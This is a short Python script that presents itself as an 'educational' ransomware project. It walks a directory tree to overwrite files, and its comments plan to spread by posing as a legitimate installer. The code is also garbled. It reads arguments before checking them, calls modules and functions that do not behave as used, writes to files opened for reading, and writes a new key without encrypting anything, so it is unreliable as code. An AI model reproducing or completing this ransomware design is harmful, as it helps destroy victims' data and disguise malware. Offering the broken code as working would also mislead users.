# import libraries for making a ramsonware project for educational purposes
import yara # for scanning files
import os # for file operations
import sys # for command line arguments
import pyew # for monitoring stages of the program
import time # for timing the program
import r2pipe # for disassembling files
import AnalyzePE # for analyzing PE files
import scapy # for network operations
from cryptography.fernet import Fernet # for encryption

# we want to create a ransomware that will encrypt a given directory and all of its subdirectories recursively
# ideally, we want to encrypt all files except for the ransomware itself
# we want to infect the system by mocking a legitimate program that requires installation of an exe file

# start the attack by asking a user for a directory to encrypt
# we will use the command line arguments to get the directory to encrypt

directory = sys.argv[1]

# we will use the command line arguments to get the directory to encrypt
if len(sys.argv) < 2:
    print("Usage: python3 ransomware.py <directory>")
    sys.exit(1)

# we will use the command line arguments to get the directory to encrypt
directory = sys.argv[1]

# if the directory does not exist, we will exit the program
if not os.path.exists(directory):
    print("Directory does not exist")
    sys.exit(1)

# start the timer and start the ransomware

start = time.time()

# start the ransomware by encrypting the directory
# we will use the os.walk function to recursively encrypt all files in the directory
for root, dirs, files in os.walk(directory):
    print("Encrypting directory: " + root)
    for file in files:
        filep = os.path.join(root, file)
        print("Encrypting file: " + filep)

        # we will use the pyew library to monitor the stages of the ransomware
        # start by opening the file
        with open(filep, "rb") as f:
            # start the pyew monitor
            mon = pyew.Monitor()
            mon.start()
            # read the file
            f.read()

            # we will use the yara library to scan the file for malicious signatures
            # start by opening the yara rules file
            rules = yara.compile(filepath="rules.yar")
            # scan the file
            matches = rules.match(data=f.read())
            # if there are matches, we will exit the program
            if matches:
                print("File is malicious")
                sys.exit(1)
            # encrypt the file
            f.write(Fernet.generate_key())
            # stop the pyew monitor
            mon.stop()
            # print the pyew monitor results
            print(mon.dump())
